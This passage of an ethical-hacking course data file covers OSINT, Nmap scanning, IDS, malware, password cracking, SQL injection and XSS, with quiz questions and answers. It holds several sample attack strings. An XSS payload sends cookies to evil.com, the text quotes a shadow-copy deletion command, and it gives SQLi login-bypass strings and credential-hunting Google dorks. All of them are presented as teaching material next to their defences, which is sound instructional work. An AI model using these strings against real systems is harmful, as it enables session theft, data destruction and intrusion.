        },
        knowledgeChecks: [
          {
            id: 'kc-d3-1',
            question: 'In which phase does an ethical tester map open ports, active services, and operating system versions?',
            options: ['Reconnaissance', 'Scanning & Enumeration', 'Maintaining Access', 'Clearing Tracks'],
            correctAnswer: 1,
            explanation: 'Scanning and Enumeration involves actively probing the target infrastructure to discover live hosts, listening ports, and running service banners.',
          },
        ],
      },
      {
        id: 'd3-t2',
        day: 3,
        title: 'Passive Reconnaissance & OSINT (Open Source Intelligence)',
        priority: 'P2',
        priorityRationale: 'High value technique to gather maximum intelligence without alerting target security monitoring.',
        estimatedMinutes: 16,
        tags: ['OSINT', 'Recon', 'Google Dorking', 'WHOIS', 'DNS'],
        explanation: {
          simpleDefinition: 'Collecting publicly accessible information about a target organization without directly interacting with its systems.',
          conciseExplanation: 'Passive reconnaissance leverages public registers, search engine indexes, archived web records, and metadata. Because queries go to third-party providers (e.g., Google, WHOIS registries, Certificate Transparency logs), the target organization cannot log the tester\'s IP address.',
          technicalDeepDive: 'Core techniques: 1) WHOIS: Registrant contact, autonomous system numbers (ASN), IP netblocks. 2) DNS Enumeration: Querying public resolvers for MX (mail servers), TXT (SPF/DKIM records), NS (nameservers), and CNAME. 3) Certificate Transparency (crt.sh): Discovering obscure subdomains created via TLS certificates. 4) Google Dorking: Using operators like `site:`, `filetype:`, `intitle:`, and `inurl:` to surface exposed config files (`filetype:env DB_PASSWORD`), admin portals (`inurl:admin/login.php`), or confidential documents.',
          practicalAnalogy: 'Like researching a company by reading their public press releases, LinkedIn employee rosters, and municipal public registry filings rather than knocking on their office doors.',
          diagramWorkflow: `Attacker
  │
  ├── Query WHOIS Registry ─────────► Reveals IP Range & ASN (Target sees nothing)
  ├── Search crt.sh Certificates ──► Discovers dev.target.com (Target sees nothing)
  └── Google Dork "site:target.com filetype:pdf" ──► Google Cache (Target sees nothing)`,
          importantTerminology: ['OSINT', 'Google Dorking', 'Certificate Transparency', 'ASN (Autonomous System Number)', 'SPF/DKIM Records'],
          commonMisconceptions: [
            'Misconception: Google Dorking is an illegal exploit technique. Reality: Google Dorking merely queries publicly indexed search engine records; accessing unauthenticated sensitive data exposed by mistake requires ethical handling.',
          ],
          officialNptelModule: 'Week 3: Footprinting and Information Gathering',
          officialNptelLectureTitle: 'Lecture 12: OSINT, Footprinting Tools and Search Queries',
          officialNptelUrl: `${OFFICIAL_NPTEL_URL}`,
          isVerified: true,
        },
        quickNotes: {
          keyTakeaways: [
            'Passive recon never generates packets directly toward the target\'s perimeter.',
            'Certificate Transparency logs (crt.sh) reveal subdomains seconds after certificates are issued.',
            'Useful Dorks: `site:example.com ext:log`, `site:example.com intitle:"index of"`, `inurl:login`.',
          ],
          comparisonTable: {
            headers: ['Technique', 'Data Gathered', 'Direct Contact With Target?', 'Stealth Level'],
            rows: [
              ['WHOIS Lookup', 'Domain owner, Registrar, DNS servers', 'No (Contacted WHOIS server)', '100% Invisible to target'],
              ['Google Dorking', 'Indexed confidential files, exposed panels', 'No (Contacted Google servers)', '100% Invisible to target'],
              ['DNS AXFR Transfer', 'Entire internal DNS zone table', 'Yes (Direct query to target DNS)', 'Logged by target DNS server'],
              ['Port Sweep (SYN)', 'Live listening ports & firewalls', 'Yes (Direct packets to target IP)', 'Logged by IDS/IPS/Firewalls'],
            ],
          },
          importantDistinctions: [
            'Passive: Zero packets sent to target infrastructure.',
            'Active: Packets sent directly to target ports, hosts, or web apps.',
          ],
          commonMistakes: [
            'Executing active scans from personal home IP addresses during a test.',
          ],
          summary: 'High-quality passive OSINT often exposes the critical path to an organization before sending a single direct packet.',
        },
        knowledgeChecks: [
          {
            id: 'kc-d3-2',
            question: 'Which Google search operator would you use to find Microsoft Excel spreadsheets containing credentials on a specific domain?',
            options: [
              'site:target.com filetype:xls password',
              'search:target.com type=excel "password"',
              'target.com + excel + password',
              'find:xls @target.com pass',
            ],
            correctAnswer: 0,
            explanation: 'The `site:` operator restricts search to the target domain, and `filetype:xls` (or `ext:xls`) restricts results to Excel spreadsheets.',
          },
        ],
      },
    ],
  },
  {
    dayNumber: 4,
    title: 'Network Security & Scanning',
    subtitle: 'Nmap Scanning Techniques, Firewalls & Intrusion Detection (IDS/IPS)',
    estimatedTotalMinutes: 60,
    labTitle: 'Virtual Nmap Scanner & Firewall Rule Evaluator',
    labDescription: 'Simulate TCP Connect vs SYN Stealth scans, analyze port status responses (Open, Closed, Filtered), and configure firewall state rules.',
    labType: 'nmap',
    learningObjectives: [
      'Compare TCP SYN Stealth Scan (-sS), TCP Connect Scan (-sT), Xmas (-sX), and UDP (-sU) scans.',
      'Interpret Nmap scan output and explain Open, Closed, and Filtered port statuses.',
      'Distinguish Packet Filtering, Stateful Inspection, and Application-Level Proxy Firewalls.',
      'Differentiate Signature-based and Anomaly-based Intrusion Detection Systems (IDS).',
    ],
    topics: [
      {
        id: 'd4-t1',
        day: 4,
        title: 'Port Scanning Mechanisms & Nmap Scan Types',
        priority: 'P1',
        priorityRationale: 'Essential core subject heavily examined in NPTEL assignments and practical lab assessments.',
        estimatedMinutes: 20,
        tags: ['Nmap', 'Port Scanning', 'SYN Stealth', 'Xmas Scan'],
        explanation: {
          simpleDefinition: 'Probing network ports to determine which services are active, listening, or blocked by firewalls.',
          conciseExplanation: 'Nmap is the industry-standard network scanner. A TCP Connect Scan (-sT) completes the entire 3-way handshake via the OS socket API, making it easy to log. A TCP SYN Scan (-sS), or "Half-Open / Stealth" scan, sends a SYN packet and awaits SYN-ACK; if received, it immediately sends a RST packet to tear down the connection before it is logged by application servers.',
          technicalDeepDive: 'Scan types: 1) SYN Scan (-sS): Requires root privileges; sends SYN; receiving SYN-ACK = Open; receiving RST = Closed; no response/ICMP error = Filtered. 2) Connect Scan (-sT): Uses unprivileged connect() syscall; reliable across proxies. 3) Inverse Scans (Null -sN, FIN -sF, Xmas -sX): In RFC 793, closed ports must respond with RST to unexpected packets, while open ports must silently drop them. If no response is received, the port is Open|Filtered (does not work against Windows, which sends RST regardless). 4) UDP Scan (-sU): Sends empty UDP datagram; ICMP Port Unreachable = Closed; no response = Open|Filtered.',
          practicalAnalogy: 'Connect Scan is like knocking, having the resident open the door, shaking their hand, and introducing yourself. SYN Stealth is like knocking, seeing someone peek through the peephole, and immediately running away before they open the door.',
          diagramWorkflow: `[TCP SYN Stealth Scan (-sS)]
Attacker                                Target Port 80 (Open)
   ├─── SYN ───────────────────────────►
   │◄── SYN-ACK (Port is listening!) ──┤
   └─── RST (Teardown! No full conn) ──► (Application never logs handshake!)

Target Port 81 (Closed)
   ├─── SYN ───────────────────────────►
   │◄── RST/ACK (Port is closed) ──────┤`,
          importantTerminology: ['TCP SYN Scan (-sS)', 'TCP Connect Scan (-sT)', 'Xmas Scan (-sX)', 'Port States: Open / Closed / Filtered', 'Banner Grabbing (-sV)'],
          commonMisconceptions: [
            'Misconception: A SYN scan is completely undetectable. Reality: Modern firewalls and Intrusion Detection Systems (IDS) detect SYN sweeps effortlessly unless fragmented or rate-limited.',
            'Misconception: Filtered port means the port is closed. Reality: Filtered means a firewall or packet filter dropped the probe, so Nmap cannot determine if the port is open or closed.',
          ],
          officialNptelModule: 'Week 4: Port Scanning and Enumeration',
          officialNptelLectureTitle: 'Lecture 16: Port Scanning with Nmap and Advanced Scan Types',
          officialNptelUrl: `${OFFICIAL_NPTEL_URL}`,
          isVerified: true,
        },
        quickNotes: {
          keyTakeaways: [
            '-sS (SYN Scan): Fast, half-open, needs root privileges.',
            '-sT (Connect Scan): Completes 3-way handshake, unprivileged.',
            'Port States: Open (service listening), Closed (RST returned), Filtered (packet dropped by firewall).',
            '-sV enables service version banner grabbing; -O performs OS TCP/IP stack fingerprinting.',
          ],
          comparisonTable: {
            headers: ['Nmap Flag', 'Scan Name', 'Packet Flags Sent', 'Open Port Response', 'Privilege Needed'],
            rows: [
              ['-sS', 'TCP SYN', 'SYN', 'SYN-ACK (Tester replies RST)', 'Yes (Raw sockets)'],
              ['-sT', 'TCP Connect', 'SYN', 'SYN-ACK (Tester replies ACK, then closes)', 'No (Standard socket API)'],
              ['-sX', 'Xmas Scan', 'FIN + PSH + URG ("lit like a xmas tree")', 'No response (RFC 793 standard)', 'Yes (Raw sockets)'],
              ['-sU', 'UDP Scan', 'Empty / Protocol UDP', 'No response or UDP packet', 'Yes (Raw sockets)'],
            ],
          },
          importantDistinctions: [
            'Closed Port: Actively returns RST/ACK.',
            'Filtered Port: Drops packet silently or returns ICMP Type 3 Code 13 (Destination Administratively Prohibited).',
          ],
          commonMistakes: [
            'Relying on Xmas scan against Windows targets (Windows sends RST for open and closed ports alike).',
          ],
          summary: 'Understanding the packet-level response of scanning mechanisms is critical for bypassing filtering and correctly enumerating target services.',
        },
        knowledgeChecks: [
          {
            id: 'kc-d4-1',
            question: 'What packet does an attacker send in an Nmap TCP SYN scan immediately upon receiving a SYN-ACK from an open port?',
            options: ['ACK', 'FIN', 'RST', 'PSH'],
            correctAnswer: 2,
            explanation: 'In a SYN stealth scan, the attacker sends an immediate RST (Reset) packet to prevent the completion of the 3-way handshake, leaving the connection half-open.',
          },
          {
            id: 'kc-d4-2',
            question: 'Which TCP flags are activated simultaneously in an Nmap Xmas Scan?',
            options: ['SYN, ACK, RST', 'FIN, PSH, URG', 'SYN, FIN, URG', 'ACK, PSH, RST'],
            correctAnswer: 1,
            explanation: 'The Xmas scan turns on the FIN, PSH, and URG flags simultaneously, illuminating the TCP header "like a Christmas tree".',
          },
        ],
      },
      {
        id: 'd4-t2',
        day: 4,
        title: 'Firewalls, IDS, and IPS Architecture',
        priority: 'P2',
        priorityRationale: 'High value defensive security concepts essential for understanding perimeter bypasses and rule evasion.',
        estimatedMinutes: 16,
        tags: ['Firewalls', 'IDS', 'IPS', 'Stateful Inspection', 'Snort'],
        explanation: {
          simpleDefinition: 'Defensive systems that filter network traffic (Firewalls) and detect/block unauthorized intrusions (IDS/IPS).',
          conciseExplanation: 'Firewalls enforce access control policies between security zones. Packet Filtering inspects headers in isolation (IP, port). Stateful Inspection tracks the state of TCP connections in a state table, automatically permitting legitimate reply packets. IDS (Intrusion Detection System) passively monitors and alerts, while IPS (Intrusion Prevention System) sits in-line to actively drop malicious packets.',
          technicalDeepDive: 'IDS detection methods: 1) Signature-Based (Knowledge-based): Compares traffic against known attack patterns (e.g., Snort rules). Extremely accurate for known exploits; blind to zero-days. 2) Anomaly-Based (Behavioral): Establishes a statistical baseline of normal network behavior and flags anomalies (e.g., sudden spike in outbound UDP traffic). Can detect unknown zero-day attacks, but suffers from higher false-positive rates. Next-Generation Firewalls (NGFW) inspect application-layer payloads (Deep Packet Inspection) regardless of port.',
          practicalAnalogy: 'Packet Filter: A bouncer with a guest list that only checks the name on your ID. Stateful Firewall: A bouncer that remembers you just walked out to your car and lets you back in without re-checking. IDS: A security camera monitor shouting "Intruder!". IPS: An automated taser barrier dropping the intruder before entry.',
          diagramWorkflow: `Internet Traffic ──► [Firewall: Stateful Filter]
                            │ (Allows authorized ports)
                            ▼
                     [IPS: In-Line Drop] ──► Inspects signatures ──► Drops malicious payloads!
                            │ (Clean traffic passes)
                            ▼
                     [Protected Internal Network / DMZ]`,
          importantTerminology: ['Stateful Inspection', 'Signature vs Anomaly IDS', 'Deep Packet Inspection (DPI)', 'DMZ (Demilitarized Zone)', 'Snort Rule'],
          commonMisconceptions: [
            'Misconception: An IDS stops attacks automatically. Reality: An IDS is passive; it only generates logs and alerts. An IPS sits in-line and actually drops or resets offending connections.',
          ],
          officialNptelModule: 'Week 4: Network Security Controls and Firewalls',
          officialNptelLectureTitle: 'Lecture 18: Firewalls, IDS, IPS and Defensive Mechanisms',
          officialNptelUrl: `${OFFICIAL_NPTEL_URL}`,
          isVerified: true,
        },
        quickNotes: {
          keyTakeaways: [
            'Stateful firewalls maintain connection tables; packet-filtering inspects packets in isolation.',
            'Signature IDS = High accuracy, known threats only. Anomaly IDS = Catches zero-days, higher false positives.',
            'IPS operates in-line to actively block packets; IDS operates out-of-band via port mirroring (SPAN).',
          ],
          comparisonTable: {
            headers: ['System', 'Position', 'Action on Detection', 'Impact on Network Latency'],
            rows: [
              ['IDS (Detection)', 'Passive / Out-of-band (SPAN port)', 'Logs alert, notifies administrator', 'Zero (packet copies analyzed in background)'],
              ['IPS (Prevention)', 'In-line (Direct traffic path)', 'Drops packet, resets TCP connection', 'Slight latency (every packet inspected before forwarding)'],
              ['Stateful Firewall', 'Perimeter boundary / Gateway', 'Enforces state tables & port/IP rules', 'Minimal (fast state lookup table)'],
            ],
          },
          importantDistinctions: [
            'False Positive: Benign traffic incorrectly flagged as malicious.',
            'False Negative: Actual malicious attack slips past undetected (dangerous!).',
          ],
          commonMistakes: [
            'Assuming signature-based IDS will detect novel zero-day exploits.',
          ],
          summary: 'Layered defense-in-depth requires stateful firewalls combined with both signature and behavioral intrusion sensors.',
        },
        knowledgeChecks: [
          {
            id: 'kc-d4-3',
            question: 'Which detection mechanism in an IDS is capable of detecting brand-new, previously unseen zero-day attacks, but is prone to higher false-positive rates?',
            options: ['Signature-based detection', 'Anomaly-based / Behavioral detection', 'Heuristic rule matching', 'Static hash verification'],
            correctAnswer: 1,
            explanation: 'Anomaly-based detection compares traffic against a learned baseline of normal behavior, allowing it to flag unusual zero-day patterns at the cost of higher false positives.',
          },
        ],
      },
    ],
  },
  {
    dayNumber: 5,
    title: 'System Security & Common Attacks',
    subtitle: 'Malware Types, Social Engineering, Credential Attacks & Privilege Escalation',
    estimatedTotalMinutes: 55,
    labTitle: 'Password Entropy & Rainbow Table Salt Sandbox',
    labDescription: 'Calculate password cracking time against GPU clusters, explore salt defense against rainbow tables, and analyze simulated phishing emails.',
    labType: 'password',
    learningObjectives: [
      'Classify malware variants: Viruses, Worms, Trojans, Ransomware, and Rootkits.',
      'Analyze social engineering vectors: Phishing, Spear Phishing, Vishing, and Baiting.',
      'Compare password cracking strategies: Brute-force, Dictionary, and Rainbow Tables.',
      'Explain privilege escalation mechanisms (SUID binaries, Windows token privileges).',
    ],
    topics: [
      {
        id: 'd5-t1',
        day: 5,
        title: 'Malware Taxonomy: Viruses, Worms, Trojans & Rootkits',
        priority: 'P1',
        priorityRationale: 'Fundamental attack classification topic tested in academic and professional cybersecurity exams.',
        estimatedMinutes: 16,
        tags: ['Malware', 'Worms', 'Ransomware', 'Rootkits', 'Trojans'],
        explanation: {
          simpleDefinition: 'Malicious software designed to infiltrate, damage, or compromise computer systems and data.',
          conciseExplanation: 'Malware is classified by its propagation and behavior. A Virus requires user intervention and a host file to spread. A Worm is self-replicating and spreads autonomously across networks without human interaction (e.g., Morris Worm, WannaCry). A Trojan disguises itself as legitimate software. A Rootkit subverts the operating system kernel to conceal malware presence.',
          technicalDeepDive: 'Rootkit types: User-mode (hooks API calls in ring 3) vs Kernel-mode (modifies OS kernel data structures like Direct Kernel Object Manipulation - DKOM in ring 0). Ransomware uses asymmetric encryption: generates an AES key locally, encrypts user files, encrypts the AES key with the attacker\'s public RSA key, and deletes Volume Shadow Copies (`vssadmin delete shadows /all`). Fileless malware resides purely in volatile RAM, leveraging native OS binaries like PowerShell (`Living off the Land` - LotL).',
          practicalAnalogy: 'Virus = Needs a person to shake hands and spread a cold (user opens infected attachment). Worm = An airborne contagion spreading through ventilation ducts with no contact needed. Trojan = The mythological wooden horse concealing hidden soldiers inside.',
          diagramWorkflow: `[Worm Propagation vs Virus Propagation]
Virus: File.exe (Infected) ──[User Clicks]──► Executes payload & infects local files
Worm:  Scans Port 445 ──[Discovers SMB Flaw]──► Self-replicates to 1,000 servers without user interaction!`,
          importantTerminology: ['Virus', 'Worm', 'Trojan Horse', 'Rootkit (Ring 0)', 'Ransomware', 'Living off the Land (LotL)'],
          commonMisconceptions: [
            'Misconception: All malware programs replicate themselves. Reality: Trojans, spyware, and rootkits do not self-replicate; only viruses and worms actively propagate.',
            'Misconception: Antivirus software catches all malware. Reality: Signature-based AV fails against polymorphic/metamorphic malware and zero-day code.',
          ],
          officialNptelModule: 'Week 5: System Attacks and Malware Classification',
          officialNptelLectureTitle: 'Lecture 21: Malware Types: Viruses, Worms and Ransomware',
          officialNptelUrl: `${OFFICIAL_NPTEL_URL}`,
          isVerified: true,
        },
        quickNotes: {
          keyTakeaways: [
            'Virus: Requires host executable file and human execution to spread.',
            'Worm: Self-propagating over networks; does not require user action.',
            'Trojan: Misleads user of its true intent; contains hidden backdoor.',
            'Rootkit: Hides processes and files at OS/kernel level (Ring 0).',
          ],
          comparisonTable: {
            headers: ['Malware Category', 'Needs Host File?', 'Requires Human Execution?', 'Primary Propagation Method'],
            rows: [
              ['Computer Virus', 'Yes (Attaches to .exe, .doc)', 'Yes (User must execute file)', 'File sharing, infected USB drives, email attachments'],
              ['Network Worm', 'No (Standalone process)', 'No (Autonomous)', 'Network protocol vulnerabilities (SMB, RPC, SSH)'],
              ['Trojan Horse', 'No (Disguised utility/installer)', 'Yes (User installs fake app)', 'Social engineering, pirated software, trojanized updates'],
              ['Kernel Rootkit', 'No (Kernel driver / module)', 'Initial exploit required', 'Direct kernel manipulation, hidden privilege hook'],
            ],
          },
          importantDistinctions: [
            'Virus requires human interaction; Worm propagates independently across networks.',
          ],
          commonMistakes: [
            'Calling WannaCry just a virus (it was a ransomware payload delivered by an autonomous network worm using EternalBlue).',
          ],
          summary: 'Accurately categorizing malware is essential for incident response containment and mitigation strategy.',
        },
        knowledgeChecks: [
          {
            id: 'kc-d5-1',
            question: 'What primary characteristic distinguishes a computer Worm from a computer Virus?',
            options: [
              'A worm encrypts files while a virus deletes them',
              'A worm propagates independently across networks without requiring user interaction or a host file',
              'A virus operates in kernel ring 0 while a worm only runs in user ring 3',
              'A worm can only infect Unix operating systems',
            ],
            correctAnswer: 1,
            explanation: 'Worms are self-contained and self-replicating programs that spread across computer networks autonomously without requiring user execution.',
          },
        ],
      },
      {
        id: 'd5-t2',
        day: 5,
        title: 'Password Attacks: Brute-Force, Rainbow Tables & Salting',
        priority: 'P2',
        priorityRationale: 'High value technical topic on credential defense and offline hash cracking principles.',
        estimatedMinutes: 18,
        tags: ['Passwords', 'Brute Force', 'Rainbow Tables', 'Salting', 'Bcrypt'],
        explanation: {
          simpleDefinition: 'Techniques used by attackers to recover plaintext passwords from stored cryptographic hashes.',
          conciseExplanation: 'Attackers recover credentials via Online attacks (submitting guesses directly to a login form; stopped by rate-limiting and account lockout) or Offline attacks (stealing a database of password hashes and cracking them locally). Offline techniques include Brute-force (trying every combination), Dictionary attacks (trying common words), and Rainbow Tables (pre-computed hash lookup tables).',
          technicalDeepDive: 'A Rainbow Table trades memory for time: it stores chains of hashes and reduction functions, allowing instant lookup of unsalted passwords. Salting completely defeats rainbow tables: A Cryptographic Salt is a unique, cryptographically random string (e.g., 16+ bytes) appended to each user\'s plaintext password before hashing. Even if two users choose the same password "password123", their salts differ, producing completely different hashes and forcing attackers to crack each user individually.',
          practicalAnalogy: 'A Rainbow Table is like a giant pre-printed dictionary of all words and their page numbers. Salting is like giving every single person their own unique secret language translation alphabet, making the universal pre-printed dictionary useless.',
          diagramWorkflow: `[Unsalted Password Hash Vulnerability]
User A: "Secret123" ──► SHA-256 ──► 2bb80faa... ◄── Rainbow Table Instant Match!
User B: "Secret123" ──► SHA-256 ──► 2bb80faa... (Identical hash!)

[Salted Password Defense]
User A: "Secret123" + Salt "x9K!z" ──► SHA-256 ──► 7c8e92...
User B: "Secret123" + Salt "m4#Lp" ──► SHA-256 ──► e4a108...
(Rainbow tables rendered useless; attacker must brute-force each user from scratch!)`,
          importantTerminology: ['Offline vs Online Attack', 'Dictionary Attack', 'Rainbow Table', 'Cryptographic Salt', 'Work Factor / Pepper', 'Argon2 / PBKDF2'],
          commonMisconceptions: [
            'Misconception: Salt needs to be kept secret like a private key. Reality: The salt is stored in plaintext in the database right next to the hash; its purpose is uniqueness to defeat pre-computed tables, not confidentiality. (A secret key added is called a "Pepper").',
          ],
          officialNptelModule: 'Week 5: Authentication Security and Password Cracking',
          officialNptelLectureTitle: 'Lecture 24: Password Attacks, Rainbow Tables and Salt Defense',
          officialNptelUrl: `${OFFICIAL_NPTEL_URL}`,
          isVerified: true,
        },
        quickNotes: {
          keyTakeaways: [
            'Online attacks are mitigated by account lockouts and rate limiting.',
            'Offline hash cracking uses GPUs to compute millions of candidate hashes per second.',
            'Rainbow tables enable instant lookup of unsalted hashes.',
            'Salting (unique random salt per user) makes rainbow tables computationally infeasible.',
          ],
          comparisonTable: {
            headers: ['Attack Type', 'Mechanism', 'Speed', 'Defensive Countermeasure'],
            rows: [
              ['Online Brute Force', 'Submitting login attempts via HTTP', 'Slow (1–10 attempts/sec)', 'Account lockout, Captcha, IP rate-limiting'],
              ['Offline Dictionary', 'Testing wordlist (rockyou.txt) against stolen hash', 'Fast (1M–100M/sec on GPU)', 'High password entropy (passphrases)'],
              ['Rainbow Table', 'Looking up pre-computed hash chains', 'Instantaneous (<1 sec lookup)', 'Cryptographic salting (unique salt per entry)'],
            ],
          },
          importantDistinctions: [
            'Salt: Public random string per record; defeats rainbow tables.',
            'Pepper: Secret application-level key; protects against stolen DB dumps without server key.',
          ],
          commonMistakes: [
            'Reusing a static universal salt for all users instead of generating a unique random salt per account.',
          ],
          summary: 'Robust credential security requires adaptive slow hash algorithms (bcrypt, Argon2) coupled with unique salts.',
        },
        knowledgeChecks: [
          {
            id: 'kc-d5-2',
            question: 'Why does adding a unique cryptographic Salt to each password defeat pre-computed Rainbow Table attacks?',
            options: [
              'Because the salt encrypts the database with AES-256',
              'Because attackers would have to recompute a dedicated billions-entry rainbow table for every single unique salt value',
              'Because the salt forces the password to be at least 32 characters long',
              'Because the salt hides the hash output from database administrators',
            ],
            correctAnswer: 1,
            explanation: 'Rainbow tables rely on pre-computing hashes once for millions of common passwords. With a unique salt per user, a pre-computed table only works for that single salt, rendering precomputation economically useless.',
          },
        ],
      },
    ],
  },
  {
    dayNumber: 6,
    title: 'Web Application Security',
    subtitle: 'OWASP Top 10, SQL Injection (SQLi), XSS & CSRF Defenses',
    estimatedTotalMinutes: 65,
    labTitle: 'SQL Injection Sandbox & XSS Sanitizer Lab',
    labDescription: 'Test vulnerable SQL queries vs Parameterized Prepared Statements, observe payload execution, and sanitize reflected script tags.',
    labType: 'web',
    learningObjectives: [
      'Examine the HTTP request/response cycle, cookies, and Session ID handling.',
      'Analyze SQL Injection (SQLi) attack vectors (In-band, Blind, Error-based) and implement Prepared Statements.',
      'Contrast Stored, Reflected, and DOM-based Cross-Site Scripting (XSS).',
      'Explain Cross-Site Request Forgery (CSRF) and defenses (Anti-CSRF tokens, SameSite cookies).',
    ],
    topics: [
      {
        id: 'd6-t1',
        day: 6,
        title: 'SQL Injection (SQLi): Mechanics & Defenses',
        priority: 'P1',
        priorityRationale: 'Essential web vulnerability appearing prominently across all NPTEL ethical hacking exams and OWASP guidelines.',
        estimatedMinutes: 22,
        tags: ['SQLi', 'Web Security', 'OWASP', 'Prepared Statements'],
        explanation: {
          simpleDefinition: 'An injection vulnerability where malicious SQL commands are inserted into user input fields and executed by the backend database.',
          conciseExplanation: 'SQL Injection occurs when untrusted user input is directly concatenated into a dynamic SQL query string. Attackers can bypass authentication (`\' OR \'1\'=\'1`), extract unauthorized database data (`UNION SELECT`), modify data, or execute operating system commands (`xp_cmdshell`). The definitive defense is Parameterized Queries (Prepared Statements).',
          technicalDeepDive: 'Types: 1) In-Band SQLi (Classic): Attacker sees results on the same channel (UNION-based, Error-based). 2) Inferential / Blind SQLi: No data reflected; attacker extracts data bit-by-bit using Boolean logic (`AND 1=1` vs `AND 1=2`) or Time delays (`AND SLEEP(5)`). 3) Out-of-Band (OOB): Data exfiltrated via DNS or HTTP requests triggered by the DB. Prepared Statements treat user input strictly as parameters (data), never as executable SQL tokens, regardless of whether quotes or semicolons are passed.',
          practicalAnalogy: 'Imagine a form where you write your name on a telegram: "Please deliver package to: [YOUR NAME]". If you write "Bob. Also please burn down the post office", and the postman executes the second sentence as an instruction, that is an injection vulnerability! A secure system puts your input inside a sealed envelope marked "Customer Name" where the postman only reads it as text.',
          diagramWorkflow: `[Vulnerable Dynamic Query Concatenation]
Input: admin' OR '1'='1
Query: SELECT * FROM users WHERE user = 'admin' OR '1'='1' AND pass = '...'
        ▲
        └─ Expression evaluates TRUE for all rows! Authentication Bypassed!

[Secure Parameterized Prepared Statement]
Query: SELECT * FROM users WHERE user = ? AND pass = ?
Param: "admin' OR '1'='1" ──► Treated 100% as literal data string! Zero injection!`,
          importantTerminology: ['In-Band SQLi', 'Blind SQLi (Boolean & Time-based)', 'UNION Based Injection', 'Prepared Statements / Parameterization', 'ORDBMS xp_cmdshell'],
          commonMisconceptions: [
            'Misconception: Escaping single quotes with regex or blacklisting `OR` / `UNION` solves SQLi. Reality: Blacklists are bypassable through encoding, comments (`/**/`), or case variation; Parameterized queries are the only comprehensive architectural fix.',
            'Misconception: Stored Procedures automatically prevent SQLi. Reality: If a stored procedure concatenates strings internally (e.g. `EXEC(\'SELECT ...\' + @input)`), it is just as vulnerable.',
          ],
          officialNptelModule: 'Week 6: Web Application Attacks and SQL Injection',
          officialNptelLectureTitle: 'Lecture 26: SQL Injection Vulnerability, Exploitation and Defense',
          officialNptelUrl: `${OFFICIAL_NPTEL_URL}`,
          isVerified: true,
        },
        quickNotes: {
          keyTakeaways: [
            'SQLi occurs when user input is concatenated into SQL commands.',
            'Payload classic: `\' OR 1=1 --` bypasses login queries.',
            'UNION-based SQLi extracts data from other database tables.',
            'Prepared Statements (Parameterized queries) are the gold-standard defense.',
          ],
          comparisonTable: {
            headers: ['SQLi Type', 'How It Works', 'Speed of Extraction', 'Detection Method'],
            rows: [
              ['UNION-Based (In-Band)', 'Appends results of attacker query to original output', 'Very fast (Full tables returned)', 'Direct output in response HTML/JSON'],
              ['Error-Based (In-Band)', 'Forces DB runtime errors containing sensitive data', 'Fast (Data leaked inside error strings)', 'Verbose DB error messages enabled'],
              ['Boolean Blind', 'Asks True/False questions based on page response changes', 'Slow (1 bit per HTTP request)', 'Response size or content differences'],
              ['Time-Based Blind', 'Uses SLEEP() or WAITFOR DELAY to measure pause', 'Very slow (Seconds per character)', 'HTTP response time threshold delays'],
            ],
          },
          importantDistinctions: [
            'Input Validation: Checks format (e.g., must be valid integer). Useful defense-in-depth, but secondary.',
            'Parameterization: Separates code from data at the database parser engine.',
          ],
          commonMistakes: [
            'Using ORM libraries but calling `.raw()` with string template interpolation.',
          ],
          summary: 'Eliminating string concatenation in database calls using prepared statements completely eradicates SQL injection.',
        },
        knowledgeChecks: [
          {
            id: 'kc-d6-1',
            question: 'What is the most effective and universally recommended architectural defense against SQL Injection vulnerabilities?',
            options: [
              'Blacklisting SQL keywords such as SELECT, UNION, and DROP',
              'Using Parameterized Queries (Prepared Statements) with bound parameters',
              'Converting all database character sets to UTF-16',
              'Encrypting the entire backend database with AES-256',
            ],
            correctAnswer: 1,
            explanation: 'Prepared Statements separate SQL query logic from user-supplied parameters, ensuring the database engine never interprets data as executable SQL commands.',
          },
        ],
      },
      {
        id: 'd6-t2',
        day: 6,
        title: 'Cross-Site Scripting (XSS) & Cross-Site Request Forgery (CSRF)',
        priority: 'P1',
        priorityRationale: 'Essential client-side web vulnerabilities impacting billions of web sessions.',
        estimatedMinutes: 20,
        tags: ['XSS', 'CSRF', 'Cookies', 'SameSite', 'Content Security Policy'],
        explanation: {
          simpleDefinition: 'Client-side web attacks that execute malicious scripts in victims\' browsers (XSS) or trick victims into executing unauthorized actions (CSRF).',
          conciseExplanation: 'XSS injects untrusted JavaScript into trusted web pages, enabling attackers to steal session cookies (`document.cookie`), redirect users, or capture keystrokes. CSRF tricks an authenticated user\'s browser into sending an unwanted HTTP request to a vulnerable site where the user is currently logged in.',
          technicalDeepDive: 'XSS Categories: 1) Stored (Persistent): Script saved in database (e.g., comments) and executed by every viewer. 2) Reflected (Non-Persistent): Script reflected off web server immediately via search queries or URL parameters. 3) DOM-Based: Vulnerability exists entirely in client-side JavaScript (`document.location`, `innerHTML`). Defenses: Context-aware output encoding, Content Security Policy (CSP), and `HttpOnly` cookie flags (prevents JavaScript access to cookies). CSRF Defenses: Anti-CSRF synchronizer tokens, SameSite cookie attributes (`SameSite=Strict` or `Lax`), and re-authentication for critical actions.',
          practicalAnalogy: 'XSS is like an attacker slipping an invisible poisoned ink pen into a bank teller\'s hand that rewrites everything they touch. CSRF is like an attacker forging a check with your signature while you are away from your desk, using your existing pre-approved bank stamp.',
          diagramWorkflow: `[Cross-Site Scripting (XSS)]
Victim visits: https://site.com/search?q=<script>fetch('http://evil.com/steal?c='+document.cookie)</script>
     │
     └── Browser executes attacker JS ──► Session Cookie stolen!

[Defense: HttpOnly Flag]
Set-Cookie: session_id=abc123xyz; Secure; HttpOnly; SameSite=Strict
     ▲
     └─ document.cookie returns EMPTY string to JavaScript! Attack neutralized!`,
          importantTerminology: ['Stored vs Reflected vs DOM XSS', 'HttpOnly Cookie Flag', 'SameSite Attribute', 'Content Security Policy (CSP)', 'Anti-CSRF Token'],
          commonMisconceptions: [
            'Misconception: `HttpOnly` flag prevents XSS. Reality: `HttpOnly` prevents cookie theft via `document.cookie`, but the attacker can still perform actions on behalf of the user using XSS (XHR requests from within the user\'s authenticated session).',
            'Misconception: Cross-Origin Resource Sharing (CORS) stops CSRF. Reality: CORS only prevents the foreign origin from reading the response; it does NOT stop the browser from issuing the state-changing request.',
          ],
          officialNptelModule: 'Week 6: Client-Side Web Attacks',
          officialNptelLectureTitle: 'Lecture 28: Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF)',
          officialNptelUrl: `${OFFICIAL_NPTEL_URL}`,
          isVerified: true,
        },
        quickNotes: {
          keyTakeaways: [
            'XSS executes malicious JavaScript inside the victim’s browser.',
